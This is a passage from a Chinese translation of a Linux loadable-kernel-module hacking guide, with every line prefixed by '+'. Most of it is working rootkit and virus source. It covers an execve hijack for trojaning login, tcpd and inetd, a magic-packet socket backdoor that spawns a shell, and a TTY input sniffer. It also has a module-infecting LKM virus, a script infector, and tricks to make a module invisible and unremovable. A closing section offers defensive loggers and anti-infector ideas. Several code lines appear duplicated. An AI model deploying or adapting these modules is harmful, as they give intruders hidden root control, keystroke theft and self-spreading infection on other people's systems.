+/*这里plaguez的用户空间到内核空间的传送指定的字符串函数比memcpy_fromfs(...)更
+好用*/
+char *strncpy_fromfs(char *dest, const char *src, int n)
+{
+char *tmp = src;
+int compt = 0;
+int compt = 0;
+do {
+dest[compt++] = __get_user(tmp++, 1);
+}
+while ((dest[compt - 1] != '\0') && (compt != n));
+return dest;
+}
+　
+/*这是用SYS_execve调用的类似系统调用宏的东西, 汇编代码调用int 0x80，寄存器设
+置为我们自己的__NR_myexecve系统调用所需要的*/
+int my_execve(const char *filename, const char *argv[], const char *envp[])
+{
+long __res;
+__asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_myexecve), "b"((long)(filename)), "c"((long) (argv)), "d"((long) (envp)));
+return (int) __res;
+}
+　
+int hacked_execve(const char *filename, const char *argv[], const char *envp[])
+{
+char *test;
+int ret, tmp;
+int ret, tmp;
+char *truc = "/bin/ls"; /*应该执行的文件*/
+char *nouveau = "/bin/ps"; /*将执行的新文件*/
+unsigned long mmm;
+test = (char *) kmalloc(strlen(truc) + 2, GFP_KERNEL);
+/*得到用户想执行的文件*/
+(void) strncpy_fromfs(test, filename, strlen(truc));
+test[strlen(truc)] = '\0';
+/*有我们想要改的文件吗？*/
+if (!strcmp(test, truc))
+{
+kfree(test);
+mmm = current->mm->brk;
+ret = brk((void *) (mmm + 256));
+if (ret < 0)
+return ret;
+/*设置新的程序名（我们想用来代替/bin/ls或其它什么的那个程序）*/
+memcpy_tofs((void *) (mmm + 2), nouveau, strlen(nouveau) + 1);
+/*用同样的参数/环境执行*/
+ret = my_execve((char *) (mmm + 2), argv, envp);
+tmp = brk((void *) mmm);
+} else {
+kfree(test);
+kfree(test);
+/*没有程序是/bin/ls，所以按正常方式运行*/
+ret = my_execve(filename, argv, envp);
+}
+return ret;
+}
+int init_module(void) /*module setup*/
+{
+/*下几行用来为我们的新myexecue选系统调用号*/
+__NR_myexecve = 200;
+while (__NR_myexecve != 0 && sys_call_table[__NR_myexecve] != 0)
+__NR_myexecve--;
+orig_execve = sys_call_table[SYS_execve];
+if (__NR_myexecve != 0)
+{
+sys_call_table[__NR_myexecve] = orig_execve;
+sys_call_table[SYS_execve] = (void *) hacked_execve;
+}
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{
+sys_call_table[SYS_execve]=orig_execve;
+}
+当你加载这个模块以后，每个对/bin/ls的调用都将执行/bin/ps。下表给你一些如何用重定向execve的思路：
+用黑客的login代替 /bin/login（plaguez 建议的）
+替换tcpd以便在某一特定点打开一个rootshell，或滤掉它的记录行为（记住CERT关于TCPD木马版本的建议）
+用rootshell替换inetd
+用rootshell替换httpd,sendmail等等任何一个你能想到的服务器，然后用一个万能字符串使用它们。
+其它系统安全相关工具。
+
+针对网络的黑客方法
+网络是黑客的乐园，让我们看一下什么能帮助我们。
+如何控制Socket操作
+通过控制Socket操作你可以做好多事。Plaguez给了我们一个漂亮的后门程序。他使用sys_socketcall系统调用，用它来接收一定长度一定内容的包。让我们看一下他改造过的系统调用（我只列出了被改造的系统调用，因为其余部分同本章中提到的其它LKM相同）：
+int hacked_socketcall(int call, unsigned long *args)
+{
+int ret, ret2, compt;
+/*万能字符串的长度*/
+int MAGICSIZE=42;
+/*万能字符串的内容*/
+char *t = "packet_contents";
+unsigned long *sargs = args;
+unsigned long a0, a1, mmm;
+void *buf;
+/*调用*/
+ret = (*o_socketcall) (call, args);
+/*收到的包的大小同万能字符串一样吗？*/
+if (ret == MAGICSIZE && call == SYS_RECVFROM)
+{
+/*处理参数*/
+a0 = get_user(sargs);
+a1 = get_user(sargs + 1);
+buf = kmalloc(ret, GFP_KERNEL);
+memcpy_fromfs(buf, (void *) a1, ret);
+for (compt = 0; compt < ret; compt++)
+if (((char *) (buf))[compt] == 0)
+((char *) (buf))[compt] = 1;
+/*是万能字符串吗？*/
+if (strstr(buf, mtroj))
+{
+kfree(buf);
+ret2 = fork();
+if (ret2 == 0)
+{
+/*如果是就执行我们的程序（shell或你想的其它的）*/
+mmm = current->mm->brk;
+ret2 = brk((void *) (mmm + 256));
+memcpy_tofs((void *) mmm + 2, (void *) t, strlen(t) + 1);
+/*plaguez的execve 实现-> 见4.2*/
+ret2 = my_execve((char *) mmm + 2, NULL, NULL);
+}
+}
+}
+return ret;
+}
+好，同以往一样，我在代码中加了很多注释，有点难看，但挺管用。代码截获了所有的sys_socketcall（对应所有关于socket的操作，见 I.2）。在改造过的系统调用中程序首先发送一个普通的系统调用。然后检查返值和调用变量。如果它是接收socket调用并且包大小（对TCP/IP包什么也不做）正确就检查包的内容，如果发现是万能字符串，程序就认为我们（黑客）想运行后门程序。这可通过my_execve(...)完成。
+我认为这种方法很好，它也可用来守侯特殊的连接/关闭模式，多点创意吧。请记住上述方法需要在特定端口有服务程序在监听，因为只有在后台进程从建立好的连接接收数据时，才会发出对接收函数的调用。这很不利，因为这可能让有病的管理员起疑心。先在你自己的系统上实验这些LKM后门，看会怎样。找到你自己偏爱的 sys_socketcall做后门的方式，在你做超级用户的系统中使用。
+
+截取TTY的方法
+截取TTY非常有意思而且被用了很久了。通过指定主设备号和从设备号我们可以截取一个TTY的所有输入。在Phrack 50 halflife公布了一个做这些的很好的LKM。下面的代码取自他的LKM，虽然没完全写完，但它会教会初学者截取TTY的基本知识，你不能把它拿来直接用，因为我没写记录用户输入的部分。它只用于那些想理解基本知识的人，我们开始：
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+　
+int errno;
+/*我们想要截取的TTY*/
+int tty_minor = 2;
+int tty_major = 4;
+extern void* sys_call_table[];
+/*我们需要write 系统调用*/
+static inline _syscall3(int, write, int, fd, char *, buf, size_t, count);
+void *original_write;
+/*检查是否为我们要找的终端*/
+int is_fd_tty(int fd)
+{
+struct file *f=NULL;
+struct inode *inode=NULL;
+int mymajor=0;
+int myminor=0;
+if(fd >= NR_OPEN || !(f=current->files->fd[fd]) || !(inode=f->f_inode))
+return 0;
+mymajor = major(inode->i_rdev);
+myminor = minor(inode->i_rdev);
+if(mymajor != tty_major) return 0;
+if(myminor != tty_minor) return 0;
+return 1;
+}
+/*这是一个新的代替write(2) 调用*/
+extern int new_write(int fd, char *buf, size_t count)
+{
+int r;
+char *kernel_buf;
+if(is_fd_tty(fd))
+{
+kernel_buf = (char*) kmalloc(count+1, GFP_KERNEL);
+memcpy_fromfs(kernel_buf, buf, count);
+/*在这里你可以输出任何缓冲区内容，这些内容对应着你通过选择主/从设备号选定的TTY设备，我没写完这段代码，因为你可以在附录A中找到一个halflife写的完整的非常好的TTY截取工具。*/
+kfree(kernel_buf);
+}
+sys_call_table[SYS_write] = original_write;
+r = write(fd, buf, count);
+sys_call_table[SYS_write] = new_write;
+if(r == -1) return -errno;
+else return r;
+}
+int init_module(void)
+{
+/*you should know / understand this...*/
+original_write = sys_call_table[SYS_write];
+sys_call_table[SYS_write] = new_write;
+return 0;
+}
+void cleanup_module(void)
+{
+/*no more hijacking*/
+sys_call_table[SYS_write] = original_write;
+}
+注释应该使这段代码很好懂。一般的思路是改动sys_write（见4.2）然后象我在4.2中提到的滤出fd的值，看一下fd是不是我们想要欺骗的TTY。获得写入的数据然后写到某个记录文件中（上例中未实现）。把记录存放到什么地方有几个方法，halflife用缓冲区（用自己的设备访问），这是一个好主意（他也可用自己的设备用ioctl命令控制他的牺牲品）。我个人推荐把记录存放入隐藏文件（通过LKM），通过某类IPC控制。在你是超级用户的系统上选一种方法。
+
+用LKM编写病毒
+现在我们把黑客部分放一放，看一下病毒代码的编写（这里讨论的思路对黑客也很有用，所以接着读）。我将把讨论集中在Stealthf0rk/SVAT写的LKM感染程序上。在附录A你可看到完整的源代码，所以本节只讨论重要的技术和函数。这个LKM需要一个Linux系统（它在2.0.33版的系统中测试过）和安装好的kerneld（我会解释原因的）。首先你要知道这个LKM感染程序不感染一般的elf可执行文件（当然也有可能，我稍后会提一下->7.1），它只感染被加载/卸载的模块。这些加载/卸载动作通常由kerneld管理（见I.7）。所以想象一下被病毒程序感染的模块，当加载这个模块时你也加载了使用隐藏特性病毒LKM（见8）。为了进一步感染，这个病毒模块改写sys_create_module 和sys_delete_module（见I.2）系统调用。当一个模块被卸载时它会被新的sys_delete_module感染。所以所有的为 kerneld（或手工）请求的模块在卸载时都将被感染。你可以想象一下第一次感染的情形：
+管理员为他的新网卡找一个网络驱动程序（ethernet,...）
+他开始搜索网络
+他找到一个可在他系统使用的驱动模块并下载
+他把模块安装到系统中[模块是被感染过的]->感染程序被安装了，系统被修改。
+当然他没下载源代码，他很懒，冒着使用二进制代码的危险。所以管理员永远别相信任何二进制文件（尤其是可加载模块）。我希望你明白LKM感染程序的机会/风险，现在让我们再进一步看一下SVAT的LKM感染程序。想象一下，你有病毒LKM的源代码（一个简单的模块，它改写sys_create_module / sys_delete_module及其它的东西[更技巧]）。第一个问题应该是如何感染已有的模块（宿主模块）。让我们做些实验。取两个模块用 ’cat’绑到一起
+# cat module1.o >> module2.o
+然后试着用insmod加载module2.o（它的尾部包含module1.o）
+# insmod module2.o
+好，加载完成，检查一下哪个模块被加载到了你的系统中
+# lsmod
+Module Pages Used by
+module2 1 0
+由此我们看出，把两个模块连起来的话，第一个模块（指object代码）会被加载，第二个会被忽略。同时没有关于insmod不能加载断裂的代码之类的错误信息。
+想一想，很明显宿主模块可用如下方式感染
+cat host_module.o >> virus_module.o
+ren virus_module.o host_module.o
+这样做以后，加载host_module.o就会把LKM型病毒加载。但有个问题，我们怎么加载那个真正的host_module？对用户/管理员来讲，当他的设备驱动程序什么也不做的时候，是很奇怪的。这里我们需要kerneld的帮助。象我在I.7中提到的，你可用kerneld加载模块。在程序中利用 request_module(‘模块名称’)，会强制kerneld加载指定模块。但我们从哪里得到原始的宿主模块呢？它被打包在 host_module.o中（同virus_module.o一起）。所以编译完virus_module.c到目标代码时要记下它的大小，这样你就会知道原始的host_module.o在被打包以后放在什么位置（你必须编译virus_module两次：第一次检查目标代码大小，第二次是编译把相关目标代码大小部分程序改动过以后的），这样你的virus_module就能够从打包模块中把原始的host_module.o抽取出来了。你必须把抽取出来的模块存在某处，然后用request_module(‘原始host_module.o’)加载它。加载了原始的host_module.o之后，你的virus_module（也是通过insmod[命令由用户或kerneld发出]加载的）就可以着手感染每个被加载的模块了。
+Stealthf0rk (SVAT)用sys_delete_module(...)系统调用进行感染，让我们看一下他改造过的系统调用（我只加了一些注释）：
+/*只有改造过的系统调用*/
+int new_delete_module(char *modname)
+{
+/*被感染模块的个数*/
+static int infected = 0;
+int retval = 0, i = 0;
+char *s = NULL, *name = NULL;
+/*调用原始的sys_delete_module*/
+retval = old_delete_module(modname);
+if ((name = (char*)vmalloc(MAXPATH + 60 + 2)) == NULL)
+return retval;
+/*检查要感染的文件-> 来自于改造过的sys_create_module; 只是这个LKM感染程序的一个特性，对这类病毒不具普遍性*/
+for (i = 0; files2infect[i][0] && i < 7; i++)
+{
+{
+strcat(files2infect[i], ".o");
+if ((s = get_mod_name(files2infect[i])) == NULL)
+{
+return retval;
+}
+name = strcpy(name, s);
+if (!is_infected(name))
+{
+/*printk(...)的宏代换函数*/
+DPRINTK("try 2 infect %s as #%d\n", name, i);
+/*感染记数加1*/
+infected++;
+/*感染函数*/
+infectfile(name);
+}
+memset(files2infect[i], 0, 60 + 2);
+} /* for */
+/* 足够了*/
+/*多少个模块被感染，如果足够多就停止运行并退出。*/
+if (infected >= ENOUGH)
+cleanup_module();
+vfree(name);
+vfree(name);
+return retval;
+}
+这里只有一个让人感兴趣的系统调用infectfile(...)，所以让我们检查一下这个函数（我也是只加了一些注释）：
+int infectfile(char *filename)
+{
+char *tmp = "/tmp/t000";
+int in = 0, out = 0;
+struct file *file1, *file2;
+/*别感到糊涂，这是病毒定义的一个宏，用来处理内核空间->用户空间的系统调用参数
+（见I.4）*/
+BEGIN_KMEM
+/*打开将被卸载的模块的目标文件*/
+in = open(filename, O_RDONLY, 0640);
+/*创建临时文件temp. file*/
+out = open(tmp, O_RDWR|O_TRUNC|O_CREAT, 0640);
+/*见BEGIN_KMEM*/
+END_KMEM
+DPRINTK("in infect文件: in = %d out = %d\n", in, out);
+if (in <= 0 || out <= 0)
+return -1;
+file1 = current->files->fd[in];
+file2 = current->files->fd[out];
+if (!file1 || !file2)
+return -1;
+/*拷贝模块（宿主）目标代码到file2*/
+cp(file1, file2);
+BEGIN_KMEM
+file1->f_pos = 0;
+file2->f_pos = 0;
+/*写入病毒代码Vircode [from mem] */
+DPRINTK("in infetc文件: filenanme = %s\n", filename);
+file1->f_op->write(file1->f_inode, file1, VirCode, MODLEN);
+cp(file2, file1);
+close(in);
+close(out);
+unlink(tmp);
+END_KMEM
+return 0;
+}
+我想感染函数应该写的很清楚了。还剩一个问题我想必须讨论的：被感染的模块最开始是如何启动病毒和加载原始模块的（我们知道了原理，但实际怎么做呢？）。要回答这个问题让我们看看load_real_mod(char *path_name, char* name)这个函数是如何处理的：
+
+/* 很简单: we disinfect the module [hide 'n seek]
+* and send a request to kerneld to load
+* the orig mod. N0 f##kin' parsing for symbols and headers
+* is needed - cool.
+*/
+int load_real_mod(char *path_name, char *name)
+{
+int r = 0, i = 0;
+struct file *file1, *file2;
+int in = 0, out = 0;
+DPRINTK("in load_real_mod name = %s\n", path_name);
+if (VirCode)
+vfree(VirCode);
+VirCode = vmalloc(MODLEN);
+if (!VirCode)
+return -1;
+BEGIN_KMEM
+/*打开刚被加载的模块(->已经被感染的那个)*/
+in = open(path_name, O_RDONLY, 0640);
+END_KMEM
+if (in <= 0)
+return -1;
+return -1;
+file1 = current->files->fd[in];
+if (!file1)
+return -1;
+/* read Vircode [into mem] */
+BEGIN_KMEM
+file1->f_op->read(file1->f_inode, file1, VirCode, MODLEN);
+close(in);
+END_KMEM
+/*分离病毒/原始模块*/
+disinfect(path_name);
+/*用kerneld加载原始模块*/
+r = request_module(name);
+DPRINTK("in load_real_mod: request_module = %d\n", r);
+return 0;
+}
+
+现在应该清楚为什么这个LKM感染程序需要kerneld了，我们要用它来响应request_module(...)以便加载原始模块。我希望你能理解这条进入LKM感染程序（病毒）世界的基本航线。下一节将介绍一些关于LKM感染程序的扩展/思路。
+
+LKM病毒如何感染任意文件（不仅仅是模块）
+请不要怪我没为这一思路提供示例，我现在真的没时间（等下一个版本再说吧）。如你在II.4.2所见，用改造过的sys_execve(...)捕捉任意文件的执行是可能的。现在想象一下，一个改造过的系统调用在将执行的程序中附上一些数据，当这个程序第二次运行时，将先执行我们加上的部分，然后才是原来的程序（最基本的病毒模式）。我们知道，早就有Linux/unix病毒了，那么我们为什么不试着用LKM感染elf可执行文件而不单单感染模块呢？我们可以这样来感染可执行程序，先检查UID=0，然后加载我们的感染模块... 我希望你能领会大致的思路。我不得不承认，elf文件的修改需要很高的技巧，但只要你付出足够的时间，你也能掌握（做之前，看一下其它Linux病毒）。
+首先你要检查用sys_execve(...)执行的文件的类型；有很多种方法，最快的一种方法是从文件中读出一些字节，检查一下是否为ELF字符串。然后就可以用write(...) / read (...) / ...等等调用来修改文件了，看一下LKM感染程序是怎么做这些的。我的理论就停留在理论上，我只给出一个很容易的、无用的LKM脚本感染程序。用它你不能做任何病毒能做的事，它只感染带有某些命令的脚本，不具备真正的病毒特征。
+我提供这个例子想给你一个LKM感染任何可执行文件的概念，甚至Java文件也可被感染，这是由Linux内核的特性决定的，下面是小例子：
+#define __KERNEL__
+#define MODULE
+/*取自原来的LKM感染程序；它使整个LKM容易多了*/
+#define BEGIN_KMEM {unsigned long old_fs=get_fs();set_fs(get_ds());
+#define END_KMEM set_fs(old_fs);}
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+int __NR_myexecve;
+extern void *sys_call_table[];
+int (*orig_execve) (const char *, const char *[], const char *[]);
+int (*open)(char *, int, int);
+int (*write)(unsigned int, char*, unsigned int);
+int (*read)(unsigned int, char*, unsigned int);
+int (*close)(int);
+　
+/*解释见II.4.2 */
+int my_execve(const char *filename, const char *argv[], const char *envp[])
+{
+long __res;
+__asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_myexecve), "b"((long) (filename)), "c"((long) (argv)), "d"((long) (envp)));
+return (int) __res;
+}
+/*染毒的execve 系统调用 + 感染程序*/
+int hacked_execve(const char *filename, const char *argv[], const char *envp[])
+{
+char *test, j;
+int ret;
+int host = 0;
+/*可读20个字节的缓冲区(用于识别可执行文件)*/
+test = (char *) kmalloc(21, GFP_KERNEL);
+/*打开将被执行的宿主脚本*/
+host=open(filename, O_RDWR|O_APPEND, 0640);
+BEGIN_KMEM
+/*读出前20个字节*/
+read(host, test, 20);
+/*如果是一个可执行shell脚本（如你所见，你可以把这个改成任何指令）*/
+if (strstr(test, "#!/bin/sh")!=NULL)
+{
+/*调试信息*/
+printk("<1>INFECT !\n");
+/*我们很友好，用无害指令*/
+write(host, "touch /tmp/WELCOME", strlen("touch /tmp/WELCOME"));
+}
+END_KMEM
+/*修改完成，关闭宿主文件*/
+close(host);
+/*释放分配的内存*/
+kfree(test);
+/*执行文件（文件已被我们修改过）*/
+ret = my_execve(filename, argv, envp);
+return ret;
+}
+　
+int init_module(void) /*module setup*/
+{
+__NR_myexecve = 250;
+while (__NR_myexecve != 0 && sys_call_table[__NR_myexecve] != 0)
+__NR_myexecve--;
+orig_execve = sys_call_table[SYS_execve];
+if (__NR_myexecve != 0)
+{
+printk("<1>everything OK\n");
+sys_call_table[__NR_myexecve] = orig_execve;
+sys_call_table[SYS_execve] = (void *) hacked_execve;
+}
+/*我们需要的一些函数*/
+open = sys_call_table[__NR_open];
+close = sys_call_table[__NR_close];
+write = sys_call_table[__NR_write];
+read = sys_call_table[__NR_read];
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{
+sys_call_table[SYS_execve]=orig_execve;
+}
+太简单了，不值得在上面浪费口舌。当然，这个模块无须kerneld就可传播（对没有kerneld支持的内核而言很重要）。我希望你理解了感染任何可执行文件的思路，这是一种干掉大系统的最有力的方法。
+
+LKM病毒如何帮助我们入侵
+如你所知，病毒编写者不是黑客，那么黑客对什么特性感兴趣呢。思考这个问题（只有10秒），你应该意识到，通过引入木马LKM你就可以控制整个系统。
+记住目前为止所有我们讨论过的黑客手法。就是没有木马你也可以用LKM入侵系统，只需在你的主目录里利用本地缓冲区溢出以加载LKM就可以了。相信我，用真正好的LKM去感染系统比你用超级用户一次次做同样的事容易多了。用LKM帮你做事更雅致一些，发挥你的创意吧。
+
+9.使我们的LKM不可见、不可删除
+现在是时候讨论最重要/最有趣的黑客手法了，这个思路来自plaguez在Phrack公布的LKM（其它人象Solar Designer以前也讨论过）。目前为止，我们能够隐藏文件、进程、目录等任何我们想要隐藏的。但是我们不能隐藏我们自己的LKM。加载LKM，然后看一下/roc/modules。
+有很多方法可使我们解决这个问题，第一种解决方法是部分文件隐藏（见II.4.3）。这很容易实现，但有更高级更安全的方法。用这种技术你必须改写sys_query_module(...)系统调用，这种方法的一个例子可参见A-b。
+我在I.1中解释过，一个模块加载完成后，要调用init_module(...)系统调用，以运行模块的初始化函数，init_module(...)获得一个参数：struct mod_routines *routines。这个结构中含有加载的LKM的重要信息。对我们来说，处理这个结构中的数据，使我们的模块无名称、无引用是可能的。这样的话，系统在 /proc/modules下就不再显示我们的LKM了，因为系统忽略没有名称且引用次数为0的LKM。下面几行展示了如何设计mod_routines 的为了隐藏模块的部分，。
+/*来自Phrack & AFHRM*/
+int init_module()
+{
+register struct module *mp asm("%ebp"); // or whatever register it is in
+*(char*)mp->name=0;
+mp->size=0;
+mp->ref=0;
+mp->ref=0;
+...
+这段代码要求gcc不处理ebp寄存器，因为我们要用它来定位正确的内存位置。找到此结构后我们把结构名和引用成员都置为0，这会使我们的模块不可见、不可删除，因为你只能删除内核知道的LKM，而我们的模块内核不知道。记住这个技巧要求gcc不改动你要用来得到结构的那个寄存器，你必须用如下的gcc选项：
+#gcc -c -O3 -fomit-frame-pointer module.c
+fomit-frame-pointer告诉cc不用在寄存器中为不需要保存帧指针的函数保存帧指针。这就使我们的函数调用init_module(...)后寄存器仍然是空的，这样我们就能访问结构了。
+我认为这是最重要的技巧了，因为它帮我们开发了不可删除的隐形的LKM。
+
+10.其它滥用内核后台进程的方法
+在 II.8中你看到了一种滥用内核的方法，用来帮我们扩散LKM感染程序，也帮我们做LKM后门（见II.5.1）。想象一下socketcall加载了一个模块，这个模块却被运行我们的后门shell脚本或程序所取代。你可以加载一个模块，这个模块在passwd或inetd.conf中加入一项记录，通过加载这第二个模块，你可以更改系统文件。同样，发挥你的想象力吧。
+
+11.如何检查我们LKM的存在
+我们学了很多种用模块帮我们破坏一个系统的方法。想象一下你编写了一个很好的后门工具（或用一个已有的）但不是用LKM写的，在一个系统中使用，例如pingd，WWW远程 shell，shell等等，你登录到那个系统之后，你怎么才能知道你原来的LKM还在运行呢？如果你的LKM没有被加载（所以进程不能被隐藏等等），你想象一下你登录一个系统而管理员正等着你会是一种什么情形吧，你开始在那个系统中做你的事（读你自己的记录，查看邮件等等），每一步管理员都在监视着。这很不好，我们必须用一种简单的检查知道我们的LKM还在运行。
+我认为如下方法很不错（虽然还有很多其它好方法）：在你的模块里写一个特殊的系统调用，在用户空间写个小程序检查这个系统调用，下面这个模块实现我们的“检查系统调用”：
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#define SYS_CHECK 200
+extern void* sys_call_table[];
+
+int sys_check()
+{
+return 666;
+}
+int init_module(void) /*module setup*/
+{
+sys_call_table[SYS_CHECK]=sys_check;
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{}
+如果你把200放入eax中做系统调用，我们就得到返值666。我们用户空间的检查程序如下
+：
+#include
+#include
+#include
+extern void *sys_call_table[];
+int check()
+{
+__asm__("movl $200,%eax int $0x80");
+}
+main()
+{
+int ret;
+ret = check();
+if (ret!=666)
+printf("Our module is *not* present !!\n");
+else
+printf("Our module is present, continue...\n");
+}
+我认为这是一种最简单的检查我们LKM是否存在的方法，试一试
+
+第三部分 解决办法（用于管理员）
+1.LKM检测程序的原理与思路
+我想是时候帮管理员针对有敌意的LKM进行系统防范的时候了。解释理论之前请记住对一个安全系统而言的如下规则：
+永远也不要安装你没有源代码的 LKM（当然，对一般的可执行程序也适用）。如果你有源代码，先查一下（如果你有这个能力），记住tcpd木马问题。大的软件包多很复杂难懂，但如果你想要一个非常安全的系统，你就应该分析源代码。甚至你遵守这些规则也有可能入侵者用LKM破坏你的系统（利用溢出等等）。所以要考虑用LKM记录每个加载的模块，拒绝从不同于源目录的其它目录加载尝试（以避免简单的溢出；这不是好办法...）。通过改写create_module(...)系统调用记录很容易作到，同样的办法你也可以检查被加载的模块来自那个目录。也可以拒绝加载任何模块，但这是个糟糕的办法，因为你自己也需要加载。所以可以用你提供密码的方式加载模块，密码通过改写create_module(...)进行检查。如果密码正确就加载模块，不对就扔掉。很清楚你应该隐藏你的LKM使它不可删除。
+让我们看一下记录用的LKM的框架实现和密码保护的create_module(...)系统调用。
+
+检测程序的实际例子
+对这个简单实现没什么可说的，只是改写了sys_create_module(...)并记录下被加载的模块的名字。
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+extern void* sys_call_table[];
+　
+int (*orig_create_module)(char*, unsigned long);
+　
+int hacked_create_module(char *name, unsigned long size)
+{
+char *kernel_name;
+char hide[]="ourtool";
+int ret;
+kernel_name = (char*) kmalloc(256, GFP_KERNEL);
+memcpy_fromfs(kernel_name, name, 255);
+/*这里我们把记录写入syslog，但你可以写入任何你想的地方*/
+printk("<1> SYS_CREATE_MODULE : %s\n", kernel_name);
+ret=orig_create_module(name, size);
+return ret;
+}
+　
+int init_module(void) /*module setup*/
+{
+orig_create_module=sys_call_table[SYS_create_module];
+sys_call_table[SYS_create_module]=hacked_create_module;
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{
+sys_call_table[SYS_create_module]=orig_create_module;
+}
+这就是你要的，当然你应该加一些隐藏模块用的代码，但这不成问题。用这种方式写了不可删除的模块之后，黑客就只能修改正常的记录文件，但你可以把你的记录存到一个黑客不能访问的文件中（相关技巧见II.1）。当然你也可以改写sys_init_module(...)来记录所有的模块，那只是爱好问题。
+
+密码保护的create_module(...)类型程序的实际例子
+本小节要处理加载内核时的认证问题。对此我们需要处理两个问题：
+检查内核加载（简单）
+认证（很难）
+第一点很容易写，只需改写sys_create_module(...)并检查一些变量，从而告知内核此加载过程是否合法。但如何认证呢，我必须承认我没花太多时间思考这个问题，所以解决方式很，但这是一篇LKM文章，所以用心想，想个更好的。我的方法是修改stat(...)系统调用，你键入任何命令时，系统都要搜索它。所以把口令作为命令键入，LKM会在修改过的stat调用中检查它[我知道这很不安全；甚至Linux初学者也可以击破这种认证模式，但在本文中这不是重点]。看一下我的实现（有很多我是从已有的LKM中拿来的，象plaguez写的）
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+
+extern void* sys_call_table[];
+/*如果lock_mod=1 则允许加载模块*/
+int lock_mod=0;
+int __NR_myexecve;
+/*改写 create_module(...) 和 stat(...) 系统调用*/
+int (*orig_create_module)(char*, unsigned long);
+int (*orig_stat) (const char *, struct old_stat*);
+char *strncpy_fromfs(char *dest, const char *src, int n)
+{
+char *tmp = src;
+int compt = 0;
+do {
+dest[compt++] = __get_user(tmp++, 1);
+}
+}
+while ((dest[compt - 1] != '\0') && (compt != n));
+return dest;
+}
+int hacked_stat(const char *filename, struct old_stat *buf)
+{
+char *name;
+int ret;
+char *password = "password"; /*呵呵，最流行的口令*/
+name = (char *) kmalloc(255, GFP_KERNEL);
+(void) strncpy_fromfs(name, filename, 255);
+/*是我们的口令吗？*/
+if (strstr(name, password)!=NULL)
+{
+/*允许加载内核一次*/
+lock_mod=1;
+kfree(name);
+return 0;
+}
+else
+{
+kfree(name);
+ret = orig_stat(filename, buf);
+}
+return ret;
+}
+int hacked_create_module(char *name, unsigned long size)
+{
+char *kernel_name;
+char hide[]="ourtool";
+int ret;
+if (lock_mod==1)
+{
+lock_mod=0;
+ret=orig_create_module(name, size);
+return ret;
+}
+else
+{
+printk("<1>MOD-POL : Permission denied !\n");
+return 0;
+}
+return ret;
+}
+　
+　
+int init_module(void) /*module setup*/
+{
+__NR_myexecve = 200;
+while (__NR_myexecve != 0 && sys_call_table[__NR_myexecve] != 0)
+__NR_myexecve--;
+sys_call_table[__NR_myexecve]=sys_call_table[SYS_execve];
+orig_stat=sys_call_table[SYS_prev_stat];
+sys_call_table[SYS_prev_stat]=hacked_stat;
+orig_create_module=sys_call_table[SYS_create_module];
+sys_call_table[SYS_create_module]=hacked_create_module;
+printk("<1>MOD-POL LOADED...\n");
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{
+sys_call_table[SYS_prev_stat]=orig_stat;
+sys_call_table[SYS_create_module]=orig_create_module;
+}
+这段代码应该很清楚了。下表告诉你如何改善LKM以使系统更安全，也许有点太疯了J ：
+找另外的认证方法（用你自己的系统调用，使用你自己的用户空间接口；用使用者ID（而非明文口令）；也许你有生物设备->阅读相关文件并编写用于 Linux的设备驱动程序然后使用;）...）。但记住，最安全的硬件保护（dongles,biometric,smartcard系统）可能经常被击破，因为它非常不安全的软件接口；你可以用这样的机制加固你的系统。用智能卡控制你的整个内核J .
+另一个不很极端的方法是实现一个你自己的系统调用来认证（见II.11写自己的系统调用的例子）。找个好点的办法在sys_create_module(...)中检查。检查变量不很安全，如果某人拿到你系统的超级用户权限，他就可以修补内存（见下面的部分）找一种方法，使攻击者用你的认证去加载他的LKM是不可以的。增加隐藏特性...
+你可以看到，还有很多事要做。但即使做了这么多，你的系统也不会完全安全。如果某个人得到系统的超级用户权限，他可找到其它方法去加载他的LKM（见下个部分）；也许他根本就不需要LKM，因为他只要系统的超级用户权限，不想（用LKM）隐藏文件/进程（和其它的东西）。
+2.Anti-LKM-Infector（防LKM感染程序）的思路
+内存驻留（实时）扫描程序（象DOS下TSR病毒扫描程序；或WIN95下VxD病毒扫描程序）检查文件的扫描程序（检查模块文件中的染毒标记）
+第一种方法可通过改写sys_create_module（或init_module调用）实现。
+第二种方法需要你在染毒文件中找到某种特征。我们知道LKM感染程序是把两个模块放到一起，所以我们可以检查是不是有两个ELF头/标记。当然其它的LKM 感染程序可用改进的方法（加密，变形代码等等）。我没有给出检查文件的扫描程序，因为你只需写一个很小的程序（用户空间）去读模块，检查一下是否有两个 ELF头（例如‘ELF’字符串）就可以了。
+3.使你的程序不可跟踪（理论）
+现在是防止黑客欺骗我们的执行的时候了。如我以前提到的，strace　strac是我们用的工具，可帮助我们知道某个程序使用了那些系统调用。Strace的其它重要应用在TICK/THC写的 ’Human to Unix Hacker’一文中有详细介绍，他告诉我们如何用strace去截取TTY。去strace你邻居用户的shell，你会得到他的所有输入。作为管理员你应该意识到strace的危险性。Strace用到如下API函数：
+#include
+int ptrace(int request, int pid, int addr, int data);
+我们怎么控制strace？别傻到把strace从你的系统中删掉，思考所有的方面，我提供的ptrace(...)是一个库函数。每个黑客可以写自己的程序来实现strace的功能。所以我们需要更安全一点的解决方案。你的第一个想法可能是找一个用于跟踪的系统调用，有这样的系统调用；但让我们先看看其它办法。记得II.5.1：我谈过任务标记。有两个标记代表被跟踪的进程。这是我们控制我们系统上的跟踪的方法。修改sys_execve(...)系统调用并检查当前进程是否设置了这两个标记。
+
+反跟踪类型程序的实例
